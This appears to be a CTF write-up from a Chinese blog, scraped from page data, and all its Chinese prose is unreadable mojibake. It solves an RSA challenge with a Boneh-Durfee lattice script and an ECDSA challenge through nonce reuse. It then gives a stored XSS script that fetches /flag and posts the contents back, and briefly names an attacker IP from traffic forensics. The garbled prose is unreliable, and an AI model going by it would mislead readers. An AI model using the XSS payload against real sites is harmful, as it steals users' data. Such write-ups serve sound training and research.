å¾—åˆ°æ•°ç»„é•¿åº¦ ä¿®æ”¹æ•°ç»„å­—æ®µ\n1 2 3 4 5 6 char javaByte[10]; for(int i = 0; i \u0026lt; 10; i++){ javaByte[i] = static_cast\u0026lt;char\u0026gt;(100 - i); } const jbyte *java_array = reinterpret_cast\u0026lt;const jbyte *\u0026gt;(javaByte); env-\u0026gt;SetByteArrayRegion(byteArray, 0, _byteArrayLength, java_array); è·å–æ•°ç»„å­—æ®µ\n1 2 3 4 5 6 7 byteArray = static_cast\u0026lt;jbyteArray\u0026gt;(env-\u0026gt;GetObjectField(ReflectDemoObj, byteArrayID)); _byteArrayLength = env-\u0026gt;GetArrayLength(byteArray); char* str = reinterpret_cast\u0026lt;char *\u0026gt;(env-\u0026gt;GetByteArrayElements(byteArray, nullptr)); for(int i = 0; i \u0026lt; _byteArrayLength; i++){ LOGD(\u0026#34;str[%d]=%d\u0026#34;, i, str[i]); } env-\u0026gt;ReleaseByteArrayElements(jbyteArray, reinterpret_cast\u0026lt;jbyte *\u0026gt;(cbyteArray), 0); ","date":"2024-12-30T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501011927263.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/android-so%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/","title":"Android Soç›¸å…³çŸ¥è¯†"},{"content":"Crypto Crypto01ï¼ˆBy Luminoriaï¼‰ å°ååˆšä¸Šç­ç¬¬ä¸€å¤©ï¼Œä¾¿å‘ç°è‡ªå·±çš„é‡è¦æ–‡ä»¶è¢«åŠ å¯†ï¼Œåªç•™ä¸‹äº†ä¸€æ®µç¥ç§˜ä»£ç ï¼Œè¯·ä½ ç»“åˆç¥ç§˜ä»£ç å¸®åŠ©ä»–è§£å¯†ã€‚\nä»é™„ä»¶å¾—åˆ°é¢˜ç›®æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from Crypto.Util.number import * from secret import flag p = getPrime(512) q = getPrime(512) n = p * q d = getPrime(299) e = inverse(d,(p-1)*(q-1)) m = bytes_to_long(flag) c = pow(m,e,n) hint1 = p \u0026gt;\u0026gt; (512-70) hint2 = q \u0026gt;\u0026gt; (512-70) print(f\u0026#34;n = {n}\u0026#34;) print(f\u0026#34;e = {e}\u0026#34;) print(f\u0026#34;c = {c}\u0026#34;) print(f\u0026#34;hint1 = {hint1}\u0026#34;) print(f\u0026#34;hint2 = {hint2}\u0026#34;) n = 114118679597315994458138232536029700477506764789782067073905766324635160145597602207164997807103187990046901850125798774503781767630201814025142189432534890147340404293319424524872695905368897290630698362559606549134377263394129199145835483978820237203114250882524438599220793209608842281879976692805855046971 e = 60930873636939710528141652371287627298970658591028170597199994159301433213017349592910581153194811053524011559886529831760967700162629319952838130973563991607758850226327915934518549584588693854388996425152821459866209334446088324204759334980239670811977086959854952233887459542997456604453766160444477603017 c = 11058775585296329544235824126670578486484201903851563493984057289075513008773878014007377223222464555346135675900619903617528838701118612201290486747980233570288315027654510774940371032813981282018787668864123759554297515664915358447425647424759926416629451915378248520432568536260902676664298855076689608823 hint1 = 884675140903190287932 hint2 = 1000130673738973880482 æ ¹æ®æ£€ç´¢ï¼Œå‘ç°æ˜¯RSAé«˜ä½çˆ†ç ´é¢˜ç›®ï¼Œå¹¶ä¸”åœ¨2023æ±Ÿè‹çœé¢†èˆªæ¯æœ‰å¯¹åº”çš„é¢˜ç›®ï¼Œè€Œä¸”éå¸¸å‡‘å·§çš„æ˜¯å¸ˆå‚…å†™äº†ä¸ªå‚»ç“œè„šæœ¬\nhttps://www.cnblogs.com/mumuhhh/p/17789591.html#bd\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 import time time.clock = time.time debug = True strict = False helpful_only = True dimension_min = 7 # å¦‚æœæ™¶æ ¼è¾¾åˆ°è¯¥å°ºå¯¸ï¼Œåˆ™åœæ­¢ç§»é™¤ # æ˜¾ç¤ºæœ‰ç”¨çŸ¢é‡çš„ç»Ÿè®¡æ•°æ® def helpful_vectors(BB, modulus): nothelpful = 0 for ii in range(BB.dimensions()[0]): if BB[ii,ii] \u0026gt;= modulus: nothelpful += 1 print (nothelpful, \u0026#34;/\u0026#34;, BB.dimensions()[0], \u0026#34; vectors are not helpful\u0026#34;) # æ˜¾ç¤ºå¸¦æœ‰ 0 å’Œ X çš„çŸ©é˜µ def matrix_overview(BB, bound): for ii in range(BB.dimensions()[0]): a = (\u0026#39;%02d \u0026#39; % ii) for jj in range(BB.dimensions()[1]): a += \u0026#39;0\u0026#39; if BB[ii,jj] == 0 else \u0026#39;X\u0026#39; if BB.dimensions()[0] \u0026lt; 60: a += \u0026#39; \u0026#39; if BB[ii, ii] \u0026gt;= bound: a += \u0026#39;~\u0026#39; #print (a) # å°è¯•åˆ é™¤æ— ç”¨çš„å‘é‡ # ä»å½“å‰ = n-1ï¼ˆæœ€åä¸€ä¸ªå‘é‡ï¼‰å¼€å§‹ def remove_unhelpful(BB, monomials, bound, current): # æˆ‘ä»¬ä»å½“å‰ = n-1ï¼ˆæœ€åä¸€ä¸ªå‘é‡ï¼‰å¼€å§‹ if current == -1 or BB.dimensions()[0] \u0026lt;= dimension_min: return BB # å¼€å§‹ä»åé¢æ£€æŸ¥ for ii in range(current, -1, -1): # å¦‚æœå®ƒæ²¡æœ‰ç”¨ if BB[ii, ii] \u0026gt;= bound: affected_vectors = 0 affected_vector_index = 0 # è®©æˆ‘ä»¬æ£€æŸ¥å®ƒæ˜¯å¦å½±å“å…¶ä»–å‘é‡ for jj in range(ii + 1, BB.dimensions()[0]): # å¦‚æœå¦ä¸€ä¸ªå‘é‡å—åˆ°å½±å“ï¼š # æˆ‘ä»¬å¢åŠ è®¡æ•° if BB[jj, ii] != 0: affected_vectors += 1 affected_vector_index = jj # ç­‰çº§ï¼š0 # å¦‚æœæ²¡æœ‰å…¶ä»–è½½ä½“æœ€ç»ˆå—åˆ°å½±å“ # æˆ‘ä»¬åˆ é™¤å®ƒ if affected_vectors == 0: #print (\u0026#34;* removing unhelpful vector\u0026#34;, ii) BB = BB.delete_columns([ii]) BB = BB.delete_rows([ii]) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # ç­‰çº§ï¼š1 #å¦‚æœåªæœ‰ä¸€ä¸ªå—åˆ°å½±å“ï¼Œæˆ‘ä»¬ä¼šæ£€æŸ¥ # å¦‚æœå®ƒæ­£åœ¨å½±å“åˆ«çš„å‘é‡ elif affected_vectors == 1: affected_deeper = True for kk in range(affected_vector_index + 1, BB.dimensions()[0]): # å¦‚æœå®ƒå½±å“å“ªæ€•ä¸€ä¸ªå‘é‡ # æˆ‘ä»¬æ”¾å¼ƒè¿™ä¸ª if BB[kk, affected_vector_index] != 0: affected_deeper = False # å¦‚æœæ²¡æœ‰å…¶ä»–å‘é‡å—åˆ°å½±å“ï¼Œåˆ™å°†å…¶åˆ é™¤ï¼Œå¹¶ä¸” # è¿™ä¸ªæœ‰ç”¨çš„å‘é‡ä¸å¤Ÿæœ‰ç”¨ #ä¸æˆ‘ä»¬æ— ç”¨çš„ç›¸æ¯” if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) \u0026lt; abs(bound - BB[ii, ii]): #print (\u0026#34;* removing unhelpful vectors\u0026#34;, ii, \u0026#34;and\u0026#34;, affected_vector_index) BB = BB.delete_columns([affected_vector_index, ii]) BB = BB.delete_rows([affected_vector_index, ii]) monomials.pop(affected_vector_index) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # nothing happened return BB \u0026#34;\u0026#34;\u0026#34; Returns: * 0,0 if it fails * -1ï¼Œ-1 å¦‚æœ \u0026#34;strict=true\u0026#34;ï¼Œå¹¶ä¸”è¡Œåˆ—å¼ä¸å—çº¦æŸ * x0,y0 the solutions of `pol` \u0026#34;\u0026#34;\u0026#34; def boneh_durfee(pol, modulus, mm, tt, XX, YY): \u0026#34;\u0026#34;\u0026#34; Boneh and Durfee revisited by Herrmann and May åœ¨ä»¥ä¸‹æƒ…å†µä¸‹æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼š * d \u0026lt; N^delta * |x|\u0026lt; e^delta * |y|\u0026lt; e^0.5 æ¯å½“ delta \u0026lt; 1 - sqrtï¼ˆ2ï¼‰/2 ~ 0.292 \u0026#34;\u0026#34;\u0026#34; # substitution (Herrman and May) PR.\u0026lt;u, x, y\u0026gt; = PolynomialRing(ZZ) #å¤šé¡¹å¼ç¯ Q = PR.quotient(x*y + 1 - u) # u = xy + 1 polZ = Q(pol).lift() UU = XX*YY + 1 # x-ç§»ä½ gg = [] for kk in range(mm + 1): for ii in range(mm - kk + 1): xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk gg.append(xshift) gg.sort() # å•é¡¹å¼ x ç§»ä½åˆ—è¡¨ monomials = [] for polynomial in gg: for monomial in polynomial.monomials(): #å¯¹äºå¤šé¡¹å¼ä¸­çš„å•é¡¹å¼ã€‚å•é¡¹å¼ï¼ˆï¼‰ï¼š if monomial not in monomials: # å¦‚æœå•é¡¹ä¸åœ¨å•é¡¹ä¸­ monomials.append(monomial) monomials.sort() # y-ç§»ä½ for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk) yshift = Q(yshift).lift() gg.append(yshift) # substitution # å•é¡¹å¼ y ç§»ä½åˆ—è¡¨ for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): monomials.append(u^kk * y^jj) # æ„é€ æ ¼ B nn = len(monomials) BB = Matrix(ZZ, nn) for ii in range(nn): BB[ii, 0] = gg[ii](0, 0, 0) for jj in range(1, ii + 1): if monomials[jj] in gg[ii].monomials(): BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY) #çº¦åŒ–æ ¼çš„åŸå‹ if helpful_only: # #è‡ªåŠ¨åˆ é™¤ BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1) # é‡ç½®ç»´åº¦ nn = BB.dimensions()[0] if nn == 0: print (\u0026#34;failure\u0026#34;) return 0,0 # æ£€æŸ¥å‘é‡æ˜¯å¦æœ‰å¸®åŠ© if debug: helpful_vectors(BB, modulus^mm) # æ£€æŸ¥è¡Œåˆ—å¼æ˜¯å¦æ­£ç¡®ç•Œå®š det = BB.det() bound = modulus^(mm*nn) if det \u0026gt;= bound: print (\u0026#34;We do not have det \u0026lt; bound. Solutions might not be found.\u0026#34;) print (\u0026#34;Try with highers m and t.\u0026#34;) if debug: diff = (log(det) - log(bound)) / log(2) print (\u0026#34;size det(L) - size e^(m*n) = \u0026#34;, floor(diff)) if strict: return -1, -1 else: print (\u0026#34;det(L) \u0026lt; e^(m*n) (good! If a solution exists \u0026lt; N^delta, it will be found)\u0026#34;) # display the lattice basis if debug: matrix_overview(BB, modulus^mm) # LLL if debug: print (\u0026#34;optimizing basis of the lattice via LLL, this can take a long time\u0026#34;) #BB = BB.BKZ(block_size=25) BB = BB.LLL() if debug: print (\u0026#34;LLL is done!\u0026#34;) # æ›¿æ¢å‘é‡ i å’Œ j -\u0026gt;å¤šé¡¹å¼ 1 å’Œ 2 if debug: print (\u0026#34;åœ¨æ ¼ä¸­å¯»æ‰¾çº¿æ€§æ— å…³å‘é‡\u0026#34;) found_polynomials = False for pol1_idx in range(nn - 1): for pol2_idx in range(pol1_idx + 1, nn): # å¯¹äºi and j, æ„é€ ä¸¤ä¸ªå¤šé¡¹å¼ PR.\u0026lt;w,z\u0026gt; = PolynomialRing(ZZ) pol1 = pol2 = 0 for jj in range(nn): pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY) pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY) # ç»“æœ PR.\u0026lt;q\u0026gt; = PolynomialRing(ZZ) rr = pol1.resultant(pol2) if rr.is_zero() or rr.monomials() == [1]: continue else: print (\u0026#34;found them, using vectors\u0026#34;, pol1_idx, \u0026#34;and\u0026#34;, pol2_idx) found_polynomials = True break if found_polynomials: break if not found_polynomials: print (\u0026#34;no independant vectors could be found. This should very rarely happen...\u0026#34;) return 0, 0 rr = rr(q, q) # solutions soly = rr.roots() if len(soly) == 0: print (\u0026#34;Your prediction (delta) is too small\u0026#34;) return 0, 0 soly = soly[0][0] ss = pol1(q, soly) solx = ss.roots()[0][0] return solx, soly def example(): ############################################ # éšæœºç”Ÿæˆæ•°æ® ########################################## #start_time =time.perf_counter start =time.clock() size=512 length_N = 2*size; ss=0 s=70; M=1 # the number of experiments delta = 299/1024 # p = random_prime(2^512,2^511) for i in range(M): # p = random_prime(2^size,None,2^(size-1)) # q = random_prime(2^size,None,2^(size-1)) # if(p\u0026lt;q): # temp=p # p=q # q=temp N = e = c = hint1 = # pé«˜ä½ hint2 = # qé«˜ä½ # print (\u0026#34;pçœŸå®é«˜\u0026#34;,s,\u0026#34;æ¯”ç‰¹ï¼š\u0026#34;, int(p/2^(512-s))) # print (\u0026#34;qçœŸå®é«˜\u0026#34;,s,\u0026#34;æ¯”ç‰¹ï¼š\u0026#34;, int(q/2^(512-s))) # N = p*q; # è§£å¯†æŒ‡æ•°dçš„æŒ‡æ•°( æœ€å¤§0.292) m = 7 # æ ¼å¤§å°ï¼ˆè¶Šå¤§è¶Šå¥½/è¶Šæ…¢ï¼‰ t = round(((1-2*delta) * m)) # æ¥è‡ª Herrmann å’Œ May çš„ä¼˜åŒ– X = floor(N^delta) # Y = floor(N^(1/2)/2^s) # å¦‚æœ pã€ q å¤§å°ç›¸åŒï¼Œåˆ™æ­£ç¡® for l in range(int(hint1),int(hint1)+1): print(\u0026#39;\\n\\n\\n l=\u0026#39;,l) pM=l; p0=pM*2^(size-s)+2^(size-s)-1; q0=N/p0; qM=int(q0/2^(size-s)) A = N + 1-pM*2^(size-s)-qM*2^(size-s); #A = N+1 P.\u0026lt;x,y\u0026gt; = PolynomialRing(ZZ) pol = 1 + x * (A + y) #æ„å»ºçš„æ–¹ç¨‹ # Checking bounds #if debug: #print (\u0026#34;=== æ ¸å¯¹æ•°æ® ===\u0026#34;) #print (\u0026#34;* delta:\u0026#34;, delta) #print (\u0026#34;* delta \u0026lt; 0.292\u0026#34;, delta \u0026lt; 0.292) #print (\u0026#34;* size of e:\u0026#34;, ceil(log(e)/log(2))) # eçš„bitæ•° # print (\u0026#34;* size of N:\u0026#34;, len(bin(N))) # Nçš„bitæ•° #print (\u0026#34;* size of N:\u0026#34;, ceil(log(N)/log(2))) # Nçš„bitæ•° #print (\u0026#34;* m:\u0026#34;, m, \u0026#34;, t:\u0026#34;, t) # boneh_durfee if debug: ##print (\u0026#34;=== running algorithm ===\u0026#34;) start_time = time.time() solx, soly = boneh_durfee(pol, e, m, t, X, Y) if solx \u0026gt; 0: #print (\u0026#34;=== solution found ===\u0026#34;) if False: print (\u0026#34;x:\u0026#34;, solx) print (\u0026#34;y:\u0026#34;, soly) d_sol = int(pol(solx, soly) / e) ss=ss+1 print (\u0026#34;=== solution found ===\u0026#34;) print (\u0026#34;pçš„é«˜æ¯”ç‰¹ä¸ºï¼š\u0026#34;,l) print (\u0026#34;qçš„é«˜æ¯”ç‰¹ä¸ºï¼š\u0026#34;,qM) print (\u0026#34;d=\u0026#34;,d_sol) if debug: print(\u0026#34;=== %s seconds ===\u0026#34; % (time.time() - start_time)) #break print(\u0026#34;ss=\u0026#34;,ss) #end=time.process_time end=time.clock() print(\u0026#39;Running time: %s Seconds\u0026#39;%(end-start)) if __name__ == \u0026#34;__main__\u0026#34;: example() æ‰€ä»¥æŠŠæ•°æ®å¡«è¿›å»ï¼Œç»è¿‡å››åç§’çš„ç´§å¼ è®¡ç®—å°±å¾—åˆ°äº†d\nd=697791299328204454525050115930116025227680411125210507143694169686384063060766101784129969\nç„¶åæ¥ä¸ªç»å…¸çš„RSAè§£å¯†è„šæœ¬\n1 2 3 4 5 6 7 8 from Crypto.Util.number import * n = 114118679597315994458138232536029700477506764789782067073905766324635160145597602207164997807103187990046901850125798774503781767630201814025142189432534890147340404293319424524872695905368897290630698362559606549134377263394129199145835483978820237203114250882524438599220793209608842281879976692805855046971 d = 697791299328204454525050115930116025227680411125210507143694169686384063060766101784129969 c = 11058775585296329544235824126670578486484201903851563493984057289075513008773878014007377223222464555346135675900619903617528838701118612201290486747980233570288315027654510774940371032813981282018787668864123759554297515664915358447425647424759926416629451915378248520432568536260902676664298855076689608823 m = pow(c,d,n) print(long_to_bytes(m)) è§£å‡ºflagä¸ºwdflag{c5b3e498-0f4c-4f40-937f-e690d8062b89}\nCrypto02ï¼ˆBy Luminoriaï¼‰ è¿ç»´äººå‘˜åœ¨ç½‘ç»œç›‘æ§ä¸­å‘ç°äº†ä¸€æ®µå¯ç–‘çš„å­—ç¬¦ä¸²ï¼Œç»è¿‡åˆæ­¥åˆ†æï¼Œä»–ä»¬æ€€ç–‘è¿™æ®µæ•°æ®å¯èƒ½æ˜¯ä½¿ç”¨AESåŠ å¯†çš„ã€‚ä¸ºäº†ç¡®å®šè¿™æ®µæ•°æ®çš„å†…å®¹ï¼Œä»–ä»¬éœ€è¦æ‰¾åˆ°æ­£ç¡®çš„å¯†é’¥ã€‚\né¢˜ç›®æºç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 # coding: utf-8 #!/usr/bin/env python2 import gmpy2 import random import binascii from hashlib import sha256 from sympy import nextprime from Crypto.Cipher import AES from Crypto.Util.Padding import pad from Crypto.Util.number import long_to_bytes from FLAG import flag #flag = \u0026#39;wdflag{123}\u0026#39; def victory_encrypt(plaintext, key): key = key.upper() key_length = len(key) plaintext = plaintext.upper() ciphertext = \u0026#39;\u0026#39; for i, char in enumerate(plaintext): if char.isalpha(): shift = ord(key[i % key_length]) - ord(\u0026#39;A\u0026#39;) encrypted_char = chr((ord(char) - ord(\u0026#39;A\u0026#39;) + shift) % 26 + ord(\u0026#39;A\u0026#39;)) ciphertext += encrypted_char else: ciphertext += char return ciphertext victory_key = \u0026#34;WANGDINGCUP\u0026#34; victory_encrypted_flag = victory_encrypt(flag, victory_key) p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f a = 0 b = 7 xG = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798 yG = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8 G = (xG, yG) n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141 h = 1 zero = (0,0) dA = nextprime(random.randint(0, n)) if dA \u0026gt; n: print(\u0026#34;warning!!\u0026#34;) def addition(t1, t2): if t1 == zero: return t2 if t2 == zero: return t2 (m1, n1) = t1 (m2, n2) = t2 if m1 == m2: if n1 == 0 or n1 != n2: return zero else: k = (3 * m1 * m1 + a) % p * gmpy2.invert(2 * n1 , p) % p else: k = (n2 - n1 + p) % p * gmpy2.invert((m2 - m1 + p) % p, p) % p m3 = (k * k % p - m1 - m2 + p * 2) % p n3 = (k * (m1 - m3) % p - n1 + p) % p return (int(m3),int(n3)) def multiplication(x, k): ans = zero t = 1 while(t \u0026lt;= k): if (k \u0026amp;t )\u0026gt;0: ans = addition(ans, x) x = addition(x, x) t \u0026lt;\u0026lt;= 1 return ans def getrs(z, k): (xp, yp) = P r = xp s = (z + r * dA % n) % n * gmpy2.invert(k, n) % n return r,s z1 = random.randint(0, p) z2 = random.randint(0, p) k = random.randint(0, n) P = multiplication(G, k) hA = multiplication(G, dA) r1, s1 = getrs(z1, k) r2, s2 = getrs(z2, k) print(\u0026#34;r1 = {}\u0026#34;.format(r1)) print(\u0026#34;r2 = {}\u0026#34;.format(r2)) print(\u0026#34;s1 = {}\u0026#34;.format(s1)) print(\u0026#34;s2 = {}\u0026#34;.format(s2)) print(\u0026#34;z1 = {}\u0026#34;.format(z1)) print(\u0026#34;z2 = {}\u0026#34;.format(z2)) key = sha256(long_to_bytes(dA)).digest() cipher = AES.new(key, AES.MODE_CBC) iv = cipher.iv encrypted_flag = cipher.encrypt(pad(victory_encrypted_flag.encode(), AES.block_size)) encrypted_flag_hex = binascii.hexlify(iv + encrypted_flag).decode(\u0026#39;utf-8\u0026#39;) print(\u0026#34;Encrypted flag (AES in CBC mode, hex):\u0026#34;, encrypted_flag_hex) # output # r1 = 111817653331957669294460466848850458804857945556928458406600106150268654577388 # r2 = 111817653331957669294460466848850458804857945556928458406600106150268654577388 # s1 = 86614391420642776223990568523561232627667766343605236785504627521619587526774 # s2 = 99777373725561160499828739472284705447694429465579067222876023876942075279416 # z1 = 96525870193778873849147733081234547336150390817999790407096946391065286856874 # z2 = 80138688082399628724400273131729065525373481983222188646486307533062536927379 # (\u0026#39;Encrypted flag (AES in CBC mode, hex):\u0026#39;, u\u0026#39;6c201c3c4e8b0a2cdd0eca11e7101d45d7b33147d27ad1b9d57e3d1e20c7b3c2e36b8da3142dfd5abe335a604ce7018878b9f157099211a7bbda56ef5285ec0b\u0026#39;) é¢˜ç›®è¯´çš„æ˜¯AESåŠ å¯†ï¼Œè€Œä¸”å¯ä»¥çœ‹åˆ°è¿™é‡Œé¢è¿˜èåˆäº†å…¶ä»–çš„åŠ å¯†ï¼Œç„¶åæˆ‘ä»¬å†™å‡ºè§£å¯†è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 import gmpy2 import binascii from hashlib import sha256 from Crypto.Cipher import AES from Crypto.Util.Padding import unpad from Crypto.Util.number import long_to_bytes # Parameters from the original code p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F a = 0 b = 7 xG = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798 yG = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8 G = (xG, yG) n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 h = 1 zero = (0, 0) # From the provided values r1 = 111817653331957669294460466848850458804857945556928458406600106150268654577388 r2 = 111817653331957669294460466848850458804857945556928458406600106150268654577388 s1 = 86614391420642776223990568523561232627667766343605236785504627521619587526774 s2 = 99777373725561160499828739472284705447694429465579067222876023876942075279416 z1 = 96525870193778873849147733081234547336150390817999790407096946391065286856874 z2 = 80138688082399628724400273131729065525373481983222188646486307533062536927379 # Calculate k k = (z1 - z2) * gmpy2.invert(s1 - s2, n) % n # Calculate dA dA = (s1 * k - z1) * gmpy2.invert(r1, n) % n # Generate AES key key = sha256(long_to_bytes(dA)).digest() # Decrypt the AES-CBC ciphertext encrypted_flag_hex = \u0026#34;6c201c3c4e8b0a2cdd0eca11e7101d45d7b33147d27ad1b9d57e3d1e20c7b3c2e36b8da3142dfd5abe335a604ce7018878b9f157099211a7bbda56ef5285ec0b\u0026#34; encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex) iv = encrypted_flag_bytes[:16] ciphertext = encrypted_flag_bytes[16:] cipher = AES.new(key, AES.MODE_CBC, iv) decrypted_flag = unpad(cipher.decrypt(ciphertext), AES.block_size) # Decrypt the Caesar cipher victory_key = \u0026#34;WANGDINGCUP\u0026#34; decrypted_flag_text = \u0026#34;\u0026#34; for char in decrypted_flag.decode(): if char.isalpha(): shift = ord(victory_key[len(decrypted_flag_text) % len(victory_key)]) - ord(\u0026#34;A\u0026#34;) decrypted_char = chr((ord(char) - ord(\u0026#34;A\u0026#34;) - shift) % 26 + ord(\u0026#34;A\u0026#34;)) decrypted_flag_text += decrypted_char else: decrypted_flag_text += char lower_flag = decrypted_flag_text.lower() print(\u0026#34;Decrypted flag:\u0026#34;, lower_flag) è¿è¡Œåå¾—åˆ°flagï¼šwdflag{58ae00432d8228c9e3a927bbcd8d67d2}\nWeb Web02ï¼ˆBy KeqingMoeï¼‰ æŸå®‰å…¨æµ‹è¯•äººå‘˜æ¥åˆ°äº†ä¸€é¡¹é‡è¦ä»»åŠ¡ï¼šå¯¹ä¸€å¥—æ— äººæœºç³»ç»Ÿçš„åå°è¿›è¡Œå®‰å…¨æµ‹è¯•ã€‚è¿™å¥—ç³»ç»Ÿè´Ÿè´£ç®¡ç†æ— äººæœºçš„é£è¡Œã€æ•°æ®ä¼ è¾“å’Œä»»åŠ¡è°ƒåº¦ï¼Œè¯·æ‚¨æµ‹è¯•è¯¥åå°æ˜¯å¦å®‰å…¨ã€‚\nå…ˆè¯•ç€éšä¾¿è¾“ä¸€ä¸ªè´¦å·å¯†ç ï¼Œå‘ç°ç›´æ¥ç™»è¿›å»äº†\nåœ¨è¾“å…¥æ¡†è¾“å…¥ä¸€äº›ä¸œè¥¿ï¼Œç‚¹æ›´æ–°ï¼Œæ›´æ–°æˆåŠŸï¼Œç„¶åè¿”å›ï¼Œå‘ç°ä¸‹é¢å°±å¤šäº†ä¸€è¡Œå­—ã€‚\nå†™ä¸€ç‚¹ html äº¤ä¸Šå»ï¼Œå‘ç°å¯ä»¥ã€‚è”ç³»å®ƒè¯´çš„ç‚¹æäº¤ä¼šå®¡æ ¸æ¸…å•ï¼Œä»è€Œæƒ³åˆ° XSS æ”»å‡»ã€‚\nç»è¿‡ç®€å•åœ°çŒœæµ‹ï¼Œæ£€æŸ¥åˆ° /flag ä¸‹æœ‰ä¸œè¥¿ï¼Œè®¿é—®ï¼Œä½†å¾—åˆ°â€œä½ æ˜¯ boss å˜›ï¼Ÿå°±æƒ³çœ‹å…¶ä»–æ— äººæœºæ‹Ÿå®šæ‰§è¡Œä»»åŠ¡ï¼Ÿâ€ä»è€Œæƒ³åˆ°ç”¨ xss æŠŠ flag æ‹¿åˆ°ä¼ å›æ¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; fetch(\u0026#39;/flag\u0026#39;) .then(data =\u0026gt; data.text()).then(data =\u0026gt; fetch(\u0026#39;/content/b279d32c6978a402f855956b080bb8a3\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; }, body: `content=${encodeURIComponent(data)}` } ) ).catch(error =\u0026gt; console.error(\u0026#39;Error: \u0026#39;, error) ) \u0026lt;/script\u0026gt; ä»è€Œæ‹¿åˆ° flag æ˜¯ wdflag{z0b2pvf3fk1d77rks6a4y6fs5chn6sqh}\nMISC MISC03ï¼ˆBy ZZPengï¼‰ è¿‘æ—¥æŸå…¬å¸æœåŠ¡å™¨é­åˆ°æ¶æ„æ”»å‡»ï¼Œéšåå…¬å¸ç«‹å³å¯¹æµé‡ç›‘æµ‹ç³»ç»Ÿä¸­é­å—æ”»å‡»æ—¶æ®µçš„æµé‡è¿›è¡Œäº†å–è¯ï¼Œä½†æ˜¯å…¬å¸æŸä¸€ç½‘ç»œå®‰å…¨å®ä¹ ç”Ÿè¿›è¡Œåˆ†ææº¯æºåå¹¶æœªæ‰¾åˆ°æ”»å‡»è€…çš„æ”»å‡»IPï¼Œäºæ˜¯å…¬å¸å†³å®šå°†è¿™ä¸ªä»»åŠ¡é‡æ–°äº¤ç»™æ›´å…·ç»éªŒçš„ä½ æ¥è¿›è¡Œï¼Œæ¥æ‰‹å·¥ä½œåï¼Œä½ ç«‹å³å¯¹å…¶è¿›è¡Œäº†æ·±å…¥è°ƒæŸ¥ï¼\nå…ˆè¿‡æ»¤httpè¯·æ±‚ï¼ˆhttp \u0026amp;\u0026amp; http.response.code != 404ï¼‰ï¼Œç„¶åå‘ç°æœ‰ä¸‰ä¸ªè¯·æ±‚é‡Œé¢ä¼ äº†hacker.phpï¼Œå¯ä»¥å¾—åˆ°IPä¸º39.168.5.60\nMISC04ï¼ˆBy KeqingMoeï¼‰ 